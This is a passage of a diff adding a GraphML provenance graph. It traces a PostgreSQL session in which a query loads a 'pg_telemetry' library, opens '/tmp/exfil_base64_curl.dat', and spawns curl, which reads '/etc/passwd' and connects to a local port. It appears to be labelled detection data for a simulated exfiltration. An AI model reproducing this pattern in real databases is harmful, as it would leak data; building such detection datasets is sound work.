+      <data key="d17">1788639304.1247835</data>
+      <data key="d28">/lib/x86_64-linux-gnu/libcom_err.so.2</data>
+    </node>
+    <node id="('File', '/lib/x86_64-linux-gnu/libkrb5support.so.0')">
+      <data key="d3">File</data>
+      <data key="d22">57589</data>
+      <data key="d23">57587</data>
+      <data key="d24">101</data>
+      <data key="d7">1788639304.1248238</data>
+      <data key="d25">curl</data>
+      <data key="d26">openat</data>
+      <data key="d27">/lib/x86_64-linux-gnu/libkrb5support.so.0</data>
+      <data key="d14">57586</data>
+      <data key="d15">5006</data>
+      <data key="d16">kernel</data>
+      <data key="d17">1788639304.1248238</data>
+      <data key="d28">/lib/x86_64-linux-gnu/libkrb5support.so.0</data>
+    </node>
+    <node id="('File', '/lib/x86_64-linux-gnu/libsasl2.so.2')">
+      <data key="d3">File</data>
+      <data key="d22">57589</data>
+      <data key="d23">57587</data>
+      <data key="d24">101</data>
+      <data key="d7">1788639304.1248658</data>
+      <data key="d25">curl</data>
+      <data key="d26">openat</data>
+      <data key="d27">/lib/x86_64-linux-gnu/libsasl2.so.2</data>
+      <data key="d14">57586</data>
+      <data key="d15">5007</data>
+      <data key="d16">kernel</data>
+      <data key="d17">1788639304.1248658</data>
+      <data key="d28">/lib/x86_64-linux-gnu/libsasl2.so.2</data>
+    </node>
+    <node id="('File', '/lib/x86_64-linux-gnu/libbrotlicommon.so.1')">
+      <data key="d3">File</data>
+      <data key="d22">57589</data>
+      <data key="d23">57587</data>
+      <data key="d24">101</data>
+      <data key="d7">1788639304.1249094</data>
+      <data key="d25">curl</data>
+      <data key="d26">openat</data>
+      <data key="d27">/lib/x86_64-linux-gnu/libbrotlicommon.so.1</data>
+      <data key="d14">57586</data>
+      <data key="d15">5008</data>
+      <data key="d16">kernel</data>
+      <data key="d17">1788639304.1249094</data>
+      <data key="d28">/lib/x86_64-linux-gnu/libbrotlicommon.so.1</data>
+    </node>
+    <node id="('File', '/lib/x86_64-linux-gnu/libp11-kit.so.0')">
+      <data key="d3">File</data>
+      <data key="d22">57589</data>
+      <data key="d23">57587</data>
+      <data key="d24">101</data>
+      <data key="d7">1788639304.1249464</data>
+      <data key="d25">curl</data>
+      <data key="d26">openat</data>
+      <data key="d27">/lib/x86_64-linux-gnu/libp11-kit.so.0</data>
+      <data key="d14">57586</data>
+      <data key="d15">5009</data>
+      <data key="d16">kernel</data>
+      <data key="d17">1788639304.1249464</data>
+      <data key="d28">/lib/x86_64-linux-gnu/libp11-kit.so.0</data>
+    </node>
+    <node id="('File', '/lib/x86_64-linux-gnu/libtasn1.so.6')">
+      <data key="d3">File</data>
+      <data key="d22">57589</data>
+      <data key="d23">57587</data>
+      <data key="d24">101</data>
+      <data key="d7">1788639304.1250086</data>
+      <data key="d25">curl</data>
+      <data key="d26">openat</data>
+      <data key="d27">/lib/x86_64-linux-gnu/libtasn1.so.6</data>
+      <data key="d14">57586</data>
+      <data key="d15">5010</data>
+      <data key="d16">kernel</data>
+      <data key="d17">1788639304.1250086</data>
+      <data key="d28">/lib/x86_64-linux-gnu/libtasn1.so.6</data>
+    </node>
+    <node id="('File', '/lib/x86_64-linux-gnu/libkeyutils.so.1')">
+      <data key="d3">File</data>
+      <data key="d22">57589</data>
+      <data key="d23">57587</data>
+      <data key="d24">101</data>
+      <data key="d7">1788639304.1250606</data>
+      <data key="d25">curl</data>
+      <data key="d26">openat</data>
+      <data key="d27">/lib/x86_64-linux-gnu/libkeyutils.so.1</data>
+      <data key="d14">57586</data>
+      <data key="d15">5011</data>
+      <data key="d16">kernel</data>
+      <data key="d17">1788639304.1250606</data>
+      <data key="d28">/lib/x86_64-linux-gnu/libkeyutils.so.1</data>
+    </node>
+    <node id="('File', '/lib/x86_64-linux-gnu/libresolv.so.2')">
+      <data key="d3">File</data>
+      <data key="d22">57589</data>
+      <data key="d23">57587</data>
+      <data key="d24">101</data>
+      <data key="d7">1788639304.1251001</data>
+      <data key="d25">curl</data>
+      <data key="d26">openat</data>
+      <data key="d27">/lib/x86_64-linux-gnu/libresolv.so.2</data>
+      <data key="d14">57586</data>
+      <data key="d15">5012</data>
+      <data key="d16">kernel</data>
+      <data key="d17">1788639304.1251001</data>
+      <data key="d28">/lib/x86_64-linux-gnu/libresolv.so.2</data>
+    </node>
+    <node id="('File', '/lib/x86_64-linux-gnu/libffi.so.8')">
+      <data key="d3">File</data>
+      <data key="d22">57589</data>
+      <data key="d23">57587</data>
+      <data key="d24">101</data>
+      <data key="d7">1788639304.125147</data>
+      <data key="d25">curl</data>
+      <data key="d26">openat</data>
+      <data key="d27">/lib/x86_64-linux-gnu/libffi.so.8</data>
+      <data key="d14">57586</data>
+      <data key="d15">5013</data>
+      <data key="d16">kernel</data>
+      <data key="d17">1788639304.125147</data>
+      <data key="d28">/lib/x86_64-linux-gnu/libffi.so.8</data>
+    </node>
+    <node id="('File', '/etc/gnutls/config')">
+      <data key="d3">File</data>
+      <data key="d22">57589</data>
+      <data key="d23">57587</data>
+      <data key="d24">101</data>
+      <data key="d7">1788639304.1281164</data>
+      <data key="d25">curl</data>
+      <data key="d26">openat</data>
+      <data key="d27">/etc/gnutls/config</data>
+      <data key="d14">57586</data>
+      <data key="d15">5014</data>
+      <data key="d16">kernel</data>
+      <data key="d17">1788639304.1281164</data>
+      <data key="d28">/etc/gnutls/config</data>
+    </node>
+    <node id="('File', '/proc/sys/crypto/fips_enabled')">
+      <data key="d3">File</data>
+      <data key="d22">57589</data>
+      <data key="d23">57587</data>
+      <data key="d24">101</data>
+      <data key="d7">1788639304.1284587</data>
+      <data key="d25">curl</data>
+      <data key="d26">openat</data>
+      <data key="d27">/proc/sys/crypto/fips_enabled</data>
+      <data key="d14">57586</data>
+      <data key="d15">5015</data>
+      <data key="d16">kernel</data>
+      <data key="d17">1788639304.1284587</data>
+      <data key="d28">/proc/sys/crypto/fips_enabled</data>
+    </node>
+    <node id="('File', '/usr/lib/ssl/openssl.cnf')">
+      <data key="d3">File</data>
+      <data key="d22">57589</data>
+      <data key="d23">57587</data>
+      <data key="d24">101</data>
+      <data key="d7">1788639304.1289122</data>
+      <data key="d25">curl</data>
+      <data key="d26">openat</data>
+      <data key="d27">/usr/lib/ssl/openssl.cnf</data>
+      <data key="d14">57586</data>
+      <data key="d15">5016</data>
+      <data key="d16">kernel</data>
+      <data key="d17">1788639304.1289122</data>
+      <data key="d28">/usr/lib/ssl/openssl.cnf</data>
+    </node>
+    <node id="('File', '/var/lib/postgresql/.curlrc')">
+      <data key="d3">File</data>
+      <data key="d22">57589</data>
+      <data key="d23">57587</data>
+      <data key="d24">101</data>
+      <data key="d7">1788639304.1292737</data>
+      <data key="d25">curl</data>
+      <data key="d26">openat</data>
+      <data key="d27">/var/lib/postgresql/.curlrc</data>
+      <data key="d14">57586</data>
+      <data key="d15">5017</data>
+      <data key="d16">kernel</data>
+      <data key="d17">1788639304.1292737</data>
+      <data key="d28">/var/lib/postgresql/.curlrc</data>
+      <data key="d21">1788639304.1294196</data>
+    </node>
+    <node id="('File', '/var/lib/postgresql/.config/curlrc')">
+      <data key="d3">File</data>
+      <data key="d22">57589</data>
+      <data key="d23">57587</data>
+      <data key="d24">101</data>
+      <data key="d7">1788639304.129284</data>
+      <data key="d25">curl</data>
+      <data key="d26">openat</data>
+      <data key="d27">/var/lib/postgresql/.config/curlrc</data>
+      <data key="d14">57586</data>
+      <data key="d15">5018</data>
+      <data key="d16">kernel</data>
+      <data key="d17">1788639304.129284</data>
+      <data key="d28">/var/lib/postgresql/.config/curlrc</data>
+    </node>
+    <node id="('File', '/etc/nsswitch.conf')">
+      <data key="d3">File</data>
+      <data key="d22">57589</data>
+      <data key="d23">57587</data>
+      <data key="d24">101</data>
+      <data key="d7">1788639304.1293705</data>
+      <data key="d25">curl</data>
+      <data key="d26">openat</data>
+      <data key="d27">/etc/nsswitch.conf</data>
+      <data key="d14">57586</data>
+      <data key="d15">5021</data>
+      <data key="d16">kernel</data>
+      <data key="d17">1788639304.1293705</data>
+      <data key="d28">/etc/nsswitch.conf</data>
+    </node>
+    <node id="('File', '/etc/passwd')">
+      <data key="d3">File</data>
+      <data key="d22">57589</data>
+      <data key="d23">57587</data>
+      <data key="d24">101</data>
+      <data key="d7">1788639304.129398</data>
+      <data key="d25">curl</data>
+      <data key="d26">openat</data>
+      <data key="d27">/etc/passwd</data>
+      <data key="d14">57586</data>
+      <data key="d15">5022</data>
+      <data key="d16">kernel</data>
+      <data key="d17">1788639304.129398</data>
+      <data key="d28">/etc/passwd</data>
+    </node>
+    <node id="('Endpoint', ('127.0.0.1', 9090))">
+      <data key="d3">Endpoint</data>
+      <data key="d22">57589</data>
+      <data key="d23">57587</data>
+      <data key="d24">101</data>
+      <data key="d7">1788639304.1296155</data>
+      <data key="d25">curl</data>
+      <data key="d26">connect</data>
+      <data key="d27" />
+      <data key="d29">127.0.0.1</data>
+      <data key="d30">9090</data>
+      <data key="d14">57586</data>
+      <data key="d15">5025</data>
+      <data key="d16">kernel</data>
+      <data key="d17">1788639304.1296155</data>
+    </node>
+    <edge source="('Query', 4637)" target="('Table', 'pgbench_accounts')">
+      <data key="d31">accesses</data>
+      <data key="d32">accesses</data>
+      <data key="d33">1</data>
+      <data key="d34">[4637]</data>
+      <data key="d35">1788639304.0</data>
+      <data key="d36">1788639304.0</data>
+      <data key="d37">accesses</data>
+    </edge>
+    <edge source="('Session', 57586)" target="('Query', 4637)">
+      <data key="d31">executes</data>
+      <data key="d32">executes</data>
+      <data key="d33">1</data>
+      <data key="d34">[4637]</data>
+      <data key="d35">1788639304.0</data>
+      <data key="d36">1788639304.0</data>
+      <data key="d37">executes</data>
+    </edge>
+    <edge source="('Session', 57586)" target="('Query', 4638)">
+      <data key="d31">executes</data>
+      <data key="d32">executes</data>
+      <data key="d33">1</data>
+      <data key="d34">[4638]</data>
+      <data key="d35">1788639304.0</data>
+      <data key="d36">1788639304.0</data>
+      <data key="d37">executes</data>
+    </edge>
+    <edge source="('Session', 57586)" target="('Query', 4639)">
+      <data key="d31">executes</data>
+      <data key="d32">executes</data>
+      <data key="d33">1</data>
+      <data key="d34">[4639]</data>
+      <data key="d35">1788639304.0</data>
+      <data key="d36">1788639304.0</data>
+      <data key="d37">executes</data>
+    </edge>
+    <edge source="('Query', 4638)" target="('Table', 'pgbench_accounts')">
+      <data key="d31">accesses</data>
+      <data key="d32">accesses</data>
+      <data key="d33">1</data>
+      <data key="d34">[4638]</data>
+      <data key="d35">1788639304.0</data>
+      <data key="d36">1788639304.0</data>
+      <data key="d37">accesses</data>
+    </edge>
+    <edge source="('Query', 4639)" target="('Table', 'pgbench_accounts')">
+      <data key="d31">accesses</data>
+      <data key="d32">accesses</data>
+      <data key="d33">1</data>
+      <data key="d34">[4639]</data>
+      <data key="d35">1788639304.0</data>
+      <data key="d36">1788639304.0</data>
+      <data key="d37">accesses</data>
+    </edge>
+    <edge source="('Query', 4639)" target="('Process', 57586)">
+      <data key="d31">spawns</data>
+      <data key="d32">spawns</data>
+      <data key="d33">13</data>
+      <data key="d34">[4954, 4955, 4956, 4957, 4958, 4959, 4960, 4961, 4968, 4969, 4970, 4971, 4973]</data>
+      <data key="d35">1788639304.1180174</data>
+      <data key="d36">1788639304.1218143</data>
+      <data key="d37">spawns</data>
+    </edge>
+    <edge source="('Process', 57586)" target="('File', 'global/pg_filenode.map')">
+      <data key="d31">opens</data>
+      <data key="d32">opens</data>
+      <data key="d33">1</data>
+      <data key="d34">[4954]</data>
+      <data key="d35">1788639304.1180174</data>
+      <data key="d36">1788639304.1180174</data>
+      <data key="d37">opens</data>
+    </edge>
+    <edge source="('Process', 57586)" target="('File', 'global/pg_internal.init')">
+      <data key="d31">opens</data>
+      <data key="d32">opens</data>
+      <data key="d33">1</data>
+      <data key="d34">[4955]</data>
+      <data key="d35">1788639304.1180685</data>
+      <data key="d36">1788639304.1180685</data>
+      <data key="d37">opens</data>
+    </edge>
+    <edge source="('Process', 57586)" target="('File', '/dev/shm/PostgreSQL.262416354')">
+      <data key="d31">opens</data>
+      <data key="d32">opens</data>
+      <data key="d33">1</data>
+      <data key="d34">[4956]</data>
+      <data key="d35">1788639304.1184185</data>
+      <data key="d36">1788639304.1184185</data>
+      <data key="d37">opens</data>
+    </edge>
+    <edge source="('Process', 57586)" target="('File', 'base/16384/PG_VERSION')">
+      <data key="d31">opens</data>
+      <data key="d32">opens</data>
+      <data key="d33">1</data>
+      <data key="d34">[4957]</data>
+      <data key="d35">1788639304.1187117</data>
+      <data key="d36">1788639304.1187117</data>
+      <data key="d37">opens</data>
+    </edge>
+    <edge source="('Process', 57586)" target="('File', 'base/16384/pg_filenode.map')">
+      <data key="d31">opens</data>
+      <data key="d32">opens</data>
+      <data key="d33">1</data>
+      <data key="d34">[4958]</data>
+      <data key="d35">1788639304.1187603</data>
+      <data key="d36">1788639304.1187603</data>
+      <data key="d37">opens</data>
+    </edge>
+    <edge source="('Process', 57586)" target="('File', 'base/16384/pg_internal.init')">
+      <data key="d31">opens</data>
+      <data key="d32">opens</data>
+      <data key="d33">1</data>
+      <data key="d34">[4959]</data>
+      <data key="d35">1788639304.1187744</data>
+      <data key="d36">1788639304.1187744</data>
+      <data key="d37">opens</data>
+    </edge>
+    <edge source="('Process', 57586)" target="('File', 'base/16384/2601')">
+      <data key="d31">opens</data>
+      <data key="d32">opens</data>
+      <data key="d33">1</data>
+      <data key="d34">[4960]</data>
+      <data key="d35">1788639304.1195219</data>
+      <data key="d36">1788639304.1195219</data>
+      <data key="d37">opens</data>
+    </edge>
+    <edge source="('Process', 57586)" target="('File', '/usr/lib/postgresql/17/lib/pg_telemetry.so')">
+      <data key="d31">opens</data>
+      <data key="d32">opens</data>
+      <data key="d33">1</data>
+      <data key="d34">[4961]</data>
+      <data key="d35">1788639304.119903</data>
+      <data key="d36">1788639304.119903</data>
+      <data key="d37">opens</data>
+    </edge>
+    <edge source="('Process', 57586)" target="('File', '/dataset_workspace/postgres_events.json')">
+      <data key="d31">opens</data>
+      <data key="d32">opens</data>
+      <data key="d33">3</data>
+      <data key="d34">[4968, 4971, 4973]</data>
+      <data key="d35">1788639304.1206725</data>
+      <data key="d36">1788639304.1218143</data>
+      <data key="d37">opens</data>
+    </edge>
+    <edge source="('Process', 57586)" target="('File', 'base/16384/17540')">
+      <data key="d31">opens</data>
+      <data key="d32">opens</data>
+      <data key="d33">1</data>
+      <data key="d34">[4969]</data>
+      <data key="d35">1788639304.1210523</data>
+      <data key="d36">1788639304.1210523</data>
+      <data key="d37">opens</data>
+    </edge>
+    <edge source="('Process', 57586)" target="('File', 'base/16384/17543')">
+      <data key="d31">opens</data>
+      <data key="d32">opens</data>
+      <data key="d33">1</data>
+      <data key="d34">[4970]</data>
+      <data key="d35">1788639304.1211474</data>
+      <data key="d36">1788639304.1211474</data>
+      <data key="d37">opens</data>
+    </edge>
+    <edge source="('Process', 57586)" target="('Process', 57587)">
+      <data key="d31">spawns</data>
+      <data key="d32">spawns</data>
+      <data key="d33">5</data>
+      <data key="d34">[4972, 4974, 4975, 4976, 4980]</data>
+      <data key="d35">1788639304.1214926</data>
+      <data key="d36">1788639304.1233213</data>
+      <data key="d37">spawns</data>
+    </edge>
+    <edge source="('Process', 57587)" target="('File', '/etc/ld.so.cache')">
+      <data key="d31">opens</data>
+      <data key="d32">opens</data>
+      <data key="d33">1</data>
+      <data key="d34">[4974]</data>
+      <data key="d35">1788639304.1218972</data>
+      <data key="d36">1788639304.1218972</data>
+      <data key="d37">opens</data>
+    </edge>
+    <edge source="('Process', 57587)" target="('File', '/lib/x86_64-linux-gnu/libc.so.6')">
+      <data key="d31">opens</data>
+      <data key="d32">opens</data>
+      <data key="d33">1</data>
+      <data key="d34">[4975]</data>
+      <data key="d35">1788639304.1219172</data>
+      <data key="d36">1788639304.1219172</data>
+      <data key="d37">opens</data>
+    </edge>
+    <edge source="('Process', 57587)" target="('File', '/tmp/exfil_base64_curl.dat')">
+      <data key="d31">opens</data>
+      <data key="d32">opens</data>
+      <data key="d33">1</data>
+      <data key="d34">[4976]</data>
+      <data key="d35">1788639304.122253</data>
+      <data key="d36">1788639304.122253</data>
+      <data key="d37">opens</data>
+    </edge>
+    <edge source="('Process', 57587)" target="('Process', 57588)">
+      <data key="d31">spawns</data>
+      <data key="d32">spawns</data>
+      <data key="d33">3</data>
+      <data key="d34">[4977, 4978, 4979]</data>
+      <data key="d35">1788639304.1223981</data>
+      <data key="d36">1788639304.1228</data>
+      <data key="d37">spawns</data>
+    </edge>
+    <edge source="('Process', 57587)" target="('File', '/dev/null')">
+      <data key="d31">opens</data>
+      <data key="d32">opens</data>
+      <data key="d33">1</data>
+      <data key="d34">[4980]</data>
+      <data key="d35">1788639304.1233213</data>
+      <data key="d36">1788639304.1233213</data>
+      <data key="d37">opens</data>
+    </edge>
+    <edge source="('Process', 57587)" target="('Process', 57589)">
+      <data key="d31">spawns</data>
+      <data key="d32">spawns</data>
+      <data key="d33">45</data>
+      <data key="d34">[4981, 4982, 4983, 4984, 4985, 4986, 4987, 4988, 4989, 4990, 4991, 4992, 4993, 4994, 4995, 4996, 4997, 4998, 4999, 5000, 5001, 5002, 5003, 5004, 5005, 5006, 5007, 5008, 5009, 5010, 5011, 5012, 5013, 5014, 5015, 5016, 5017, 5018, 5019, 5020, 5021, 5022, 5023, 5024, 5025]</data>
+      <data key="d35">1788639304.1233923</data>
+      <data key="d36">1788639304.1296155</data>
+      <data key="d37">spawns</data>
+    </edge>
+    <edge source="('Process', 57588)" target="('File', '/etc/ld.so.cache')">
+      <data key="d31">opens</data>
+      <data key="d32">opens</data>
+      <data key="d33">1</data>
+      <data key="d34">[4978]</data>
+      <data key="d35">1788639304.1227791</data>
+      <data key="d36">1788639304.1227791</data>
+      <data key="d37">opens</data>
+    </edge>
+    <edge source="('Process', 57588)" target="('File', '/lib/x86_64-linux-gnu/libc.so.6')">
+      <data key="d31">opens</data>
+      <data key="d32">opens</data>
+      <data key="d33">1</data>
+      <data key="d34">[4979]</data>
+      <data key="d35">1788639304.1228</data>
+      <data key="d36">1788639304.1228</data>
+      <data key="d37">opens</data>
+    </edge>
+    <edge source="('Process', 57589)" target="('File', '/etc/ld.so.cache')">
+      <data key="d31">opens</data>
+      <data key="d32">opens</data>
+      <data key="d33">1</data>
+      <data key="d34">[4982]</data>
+      <data key="d35">1788639304.1237614</data>
+      <data key="d36">1788639304.1237614</data>
+      <data key="d37">opens</data>
+    </edge>
+    <edge source="('Process', 57589)" target="('File', '/lib/x86_64-linux-gnu/libcurl.so.4')">
+      <data key="d31">opens</data>
+      <data key="d32">opens</data>
+      <data key="d33">1</data>
+      <data key="d34">[4983]</data>
+      <data key="d35">1788639304.1237793</data>
+      <data key="d36">1788639304.1237793</data>
+      <data key="d37">opens</data>
+    </edge>
+    <edge source="('Process', 57589)" target="('File', '/lib/x86_64-linux-gnu/libz.so.1')">
+      <data key="d31">opens</data>
+      <data key="d32">opens</data>
+      <data key="d33">1</data>
+      <data key="d34">[4984]</data>
+      <data key="d35">1788639304.1238253</data>
+      <data key="d36">1788639304.1238253</data>
+      <data key="d37">opens</data>
+    </edge>
+    <edge source="('Process', 57589)" target="('File', '/lib/x86_64-linux-gnu/libc.so.6')">
+      <data key="d31">opens</data>
+      <data key="d32">opens</data>
+      <data key="d33">1</data>
+      <data key="d34">[4985]</data>
+      <data key="d35">1788639304.1238682</data>
+      <data key="d36">1788639304.1238682</data>
+      <data key="d37">opens</data>
+    </edge>
+    <edge source="('Process', 57589)" target="('File', '/lib/x86_64-linux-gnu/libnghttp2.so.14')">
+      <data key="d31">opens</data>
+      <data key="d32">opens</data>
+      <data key="d33">1</data>
+      <data key="d34">[4986]</data>
+      <data key="d35">1788639304.1239197</data>
+      <data key="d36">1788639304.1239197</data>
+      <data key="d37">opens</data>
+    </edge>
+    <edge source="('Process', 57589)" target="('File', '/lib/x86_64-linux-gnu/libidn2.so.0')">
+      <data key="d31">opens</data>
+      <data key="d32">opens</data>
+      <data key="d33">1</data>
+      <data key="d34">[4987]</data>
+      <data key="d35">1788639304.1239665</data>
+      <data key="d36">1788639304.1239665</data>
+      <data key="d37">opens</data>
+    </edge>
+    <edge source="('Process', 57589)" target="('File', '/lib/x86_64-linux-gnu/librtmp.so.1')">
+      <data key="d31">opens</data>
+      <data key="d32">opens</data>
+      <data key="d33">1</data>
+      <data key="d34">[4988]</data>
+      <data key="d35">1788639304.1240053</data>
+      <data key="d36">1788639304.1240053</data>
+      <data key="d37">opens</data>
+    </edge>
+    <edge source="('Process', 57589)" target="('File', '/lib/x86_64-linux-gnu/libssh.so.4')">
+      <data key="d31">opens</data>
+      <data key="d32">opens</data>
+      <data key="d33">1</data>
+      <data key="d34">[4989]</data>
+      <data key="d35">1788639304.1240532</data>
+      <data key="d36">1788639304.1240532</data>
+      <data key="d37">opens</data>
+    </edge>
+    <edge source="('Process', 57589)" target="('File', '/lib/x86_64-linux-gnu/libpsl.so.5')">
+      <data key="d31">opens</data>
+      <data key="d32">opens</data>
+      <data key="d33">1</data>
+      <data key="d34">[4990]</data>
+      <data key="d35">1788639304.124093</data>
+      <data key="d36">1788639304.124093</data>
+      <data key="d37">opens</data>
+    </edge>
+    <edge source="('Process', 57589)" target="('File', '/lib/x86_64-linux-gnu/libssl.so.3')">
+      <data key="d31">opens</data>
+      <data key="d32">opens</data>
+      <data key="d33">1</data>
+      <data key="d34">[4991]</data>
+      <data key="d35">1788639304.1241267</data>
+      <data key="d36">1788639304.1241267</data>
+      <data key="d37">opens</data>
+    </edge>
+    <edge source="('Process', 57589)" target="('File', '/lib/x86_64-linux-gnu/libcrypto.so.3')">
+      <data key="d31">opens</data>
+      <data key="d32">opens</data>
+      <data key="d33">1</data>
+      <data key="d34">[4992]</data>
+      <data key="d35">1788639304.124172</data>
+      <data key="d36">1788639304.124172</data>
+      <data key="d37">opens</data>
+    </edge>
+    <edge source="('Process', 57589)" target="('File', '/lib/x86_64-linux-gnu/libgssapi_krb5.so.2')">
+      <data key="d31">opens</data>
+      <data key="d32">opens</data>
+      <data key="d33">1</data>
+      <data key="d34">[4993]</data>
+      <data key="d35">1788639304.1242177</data>
+      <data key="d36">1788639304.1242177</data>
+      <data key="d37">opens</data>
+    </edge>
+    <edge source="('Process', 57589)" target="('File', '/lib/x86_64-linux-gnu/libldap.so.2')">
+      <data key="d31">opens</data>
+      <data key="d32">opens</data>
+      <data key="d33">1</data>
+      <data key="d34">[4994]</data>
+      <data key="d35">1788639304.124263</data>
+      <data key="d36">1788639304.124263</data>
+      <data key="d37">opens</data>
+    </edge>
+    <edge source="('Process', 57589)" target="('File', '/lib/x86_64-linux-gnu/liblber.so.2')">
+      <data key="d31">opens</data>
+      <data key="d32">opens</data>
+      <data key="d33">1</data>
+      <data key="d34">[4995]</data>
+      <data key="d35">1788639304.1243281</data>
+      <data key="d36">1788639304.1243281</data>
+      <data key="d37">opens</data>
+    </edge>
+    <edge source="('Process', 57589)" target="('File', '/lib/x86_64-linux-gnu/libzstd.so.1')">
+      <data key="d31">opens</data>
+      <data key="d32">opens</data>
+      <data key="d33">1</data>
+      <data key="d34">[4996]</data>
+      <data key="d35">1788639304.1243696</data>
+      <data key="d36">1788639304.1243696</data>
+      <data key="d37">opens</data>
+    </edge>
+    <edge source="('Process', 57589)" target="('File', '/lib/x86_64-linux-gnu/libbrotlidec.so.1')">
+      <data key="d31">opens</data>
+      <data key="d32">opens</data>
+      <data key="d33">1</data>
+      <data key="d34">[4997]</data>
+      <data key="d35">1788639304.1244109</data>
+      <data key="d36">1788639304.1244109</data>
+      <data key="d37">opens</data>
+    </edge>
+    <edge source="('Process', 57589)" target="('File', '/lib/x86_64-linux-gnu/libunistring.so.5')">
+      <data key="d31">opens</data>
+      <data key="d32">opens</data>
+      <data key="d33">1</data>
+      <data key="d34">[4998]</data>
+      <data key="d35">1788639304.12445</data>
+      <data key="d36">1788639304.12445</data>
+      <data key="d37">opens</data>
+    </edge>
+    <edge source="('Process', 57589)" target="('File', '/lib/x86_64-linux-gnu/libgnutls.so.30')">
+      <data key="d31">opens</data>
+      <data key="d32">opens</data>
+      <data key="d33">1</data>
+      <data key="d34">[4999]</data>
+      <data key="d35">1788639304.124495</data>
+      <data key="d36">1788639304.124495</data>
+      <data key="d37">opens</data>
+    </edge>
+    <edge source="('Process', 57589)" target="('File', '/lib/x86_64-linux-gnu/libhogweed.so.6')">
+      <data key="d31">opens</data>
+      <data key="d32">opens</data>
+      <data key="d33">1</data>
+      <data key="d34">[5000]</data>
+      <data key="d35">1788639304.1245518</data>
+      <data key="d36">1788639304.1245518</data>
+      <data key="d37">opens</data>
+    </edge>
+    <edge source="('Process', 57589)" target="('File', '/lib/x86_64-linux-gnu/libnettle.so.8')">
+      <data key="d31">opens</data>
+      <data key="d32">opens</data>
+      <data key="d33">1</data>
+      <data key="d34">[5001]</data>
+      <data key="d35">1788639304.1245897</data>
+      <data key="d36">1788639304.1245897</data>
+      <data key="d37">opens</data>
+    </edge>
+    <edge source="('Process', 57589)" target="('File', '/lib/x86_64-linux-gnu/libgmp.so.10')">
+      <data key="d31">opens</data>
+      <data key="d32">opens</data>
+      <data key="d33">1</data>
+      <data key="d34">[5002]</data>
+      <data key="d35">1788639304.12464</data>
+      <data key="d36">1788639304.12464</data>
+      <data key="d37">opens</data>
+    </edge>
+    <edge source="('Process', 57589)" target="('File', '/lib/x86_64-linux-gnu/libkrb5.so.3')">
+      <data key="d31">opens</data>
+      <data key="d32">opens</data>
+      <data key="d33">1</data>
+      <data key="d34">[5003]</data>
+      <data key="d35">1788639304.1246927</data>
+      <data key="d36">1788639304.1246927</data>
+      <data key="d37">opens</data>
+    </edge>
+    <edge source="('Process', 57589)" target="('File', '/lib/x86_64-linux-gnu/libk5crypto.so.3')">
+      <data key="d31">opens</data>
+      <data key="d32">opens</data>
+      <data key="d33">1</data>
+      <data key="d34">[5004]</data>
+      <data key="d35">1788639304.12474</data>
+      <data key="d36">1788639304.12474</data>
+      <data key="d37">opens</data>
+    </edge>
+    <edge source="('Process', 57589)" target="('File', '/lib/x86_64-linux-gnu/libcom_err.so.2')">
+      <data key="d31">opens</data>
+      <data key="d32">opens</data>
+      <data key="d33">1</data>
+      <data key="d34">[5005]</data>
+      <data key="d35">1788639304.1247835</data>
+      <data key="d36">1788639304.1247835</data>
+      <data key="d37">opens</data>
+    </edge>
+    <edge source="('Process', 57589)" target="('File', '/lib/x86_64-linux-gnu/libkrb5support.so.0')">
+      <data key="d31">opens</data>
+      <data key="d32">opens</data>
+      <data key="d33">1</data>
+      <data key="d34">[5006]</data>
+      <data key="d35">1788639304.1248238</data>
+      <data key="d36">1788639304.1248238</data>
+      <data key="d37">opens</data>
+    </edge>
+    <edge source="('Process', 57589)" target="('File', '/lib/x86_64-linux-gnu/libsasl2.so.2')">
+      <data key="d31">opens</data>
+      <data key="d32">opens</data>
+      <data key="d33">1</data>
+      <data key="d34">[5007]</data>
+      <data key="d35">1788639304.1248658</data>
+      <data key="d36">1788639304.1248658</data>
+      <data key="d37">opens</data>
+    </edge>
+    <edge source="('Process', 57589)" target="('File', '/lib/x86_64-linux-gnu/libbrotlicommon.so.1')">
+      <data key="d31">opens</data>
+      <data key="d32">opens</data>
+      <data key="d33">1</data>
+      <data key="d34">[5008]</data>
+      <data key="d35">1788639304.1249094</data>
+      <data key="d36">1788639304.1249094</data>
+      <data key="d37">opens</data>
+    </edge>
+    <edge source="('Process', 57589)" target="('File', '/lib/x86_64-linux-gnu/libp11-kit.so.0')">
+      <data key="d31">opens</data>
+      <data key="d32">opens</data>
+      <data key="d33">1</data>
+      <data key="d34">[5009]</data>
+      <data key="d35">1788639304.1249464</data>
+      <data key="d36">1788639304.1249464</data>
+      <data key="d37">opens</data>
+    </edge>
+    <edge source="('Process', 57589)" target="('File', '/lib/x86_64-linux-gnu/libtasn1.so.6')">
+      <data key="d31">opens</data>
+      <data key="d32">opens</data>
+      <data key="d33">1</data>
+      <data key="d34">[5010]</data>
+      <data key="d35">1788639304.1250086</data>
+      <data key="d36">1788639304.1250086</data>
+      <data key="d37">opens</data>
+    </edge>
+    <edge source="('Process', 57589)" target="('File', '/lib/x86_64-linux-gnu/libkeyutils.so.1')">
+      <data key="d31">opens</data>
+      <data key="d32">opens</data>
+      <data key="d33">1</data>
+      <data key="d34">[5011]</data>
+      <data key="d35">1788639304.1250606</data>
+      <data key="d36">1788639304.1250606</data>
+      <data key="d37">opens</data>
+    </edge>
+    <edge source="('Process', 57589)" target="('File', '/lib/x86_64-linux-gnu/libresolv.so.2')">
+      <data key="d31">opens</data>
+      <data key="d32">opens</data>
+      <data key="d33">1</data>
+      <data key="d34">[5012]</data>
+      <data key="d35">1788639304.1251001</data>
+      <data key="d36">1788639304.1251001</data>
+      <data key="d37">opens</data>
+    </edge>
+    <edge source="('Process', 57589)" target="('File', '/lib/x86_64-linux-gnu/libffi.so.8')">
+      <data key="d31">opens</data>
+      <data key="d32">opens</data>
+      <data key="d33">1</data>
+      <data key="d34">[5013]</data>
+      <data key="d35">1788639304.125147</data>
+      <data key="d36">1788639304.125147</data>
+      <data key="d37">opens</data>
+    </edge>
+    <edge source="('Process', 57589)" target="('File', '/etc/gnutls/config')">
+      <data key="d31">opens</data>
+      <data key="d32">opens</data>
+      <data key="d33">1</data>
+      <data key="d34">[5014]</data>
+      <data key="d35">1788639304.1281164</data>
+      <data key="d36">1788639304.1281164</data>
+      <data key="d37">opens</data>
+    </edge>
+    <edge source="('Process', 57589)" target="('File', '/proc/sys/crypto/fips_enabled')">
+      <data key="d31">opens</data>
+      <data key="d32">opens</data>
+      <data key="d33">1</data>
+      <data key="d34">[5015]</data>
+      <data key="d35">1788639304.1284587</data>
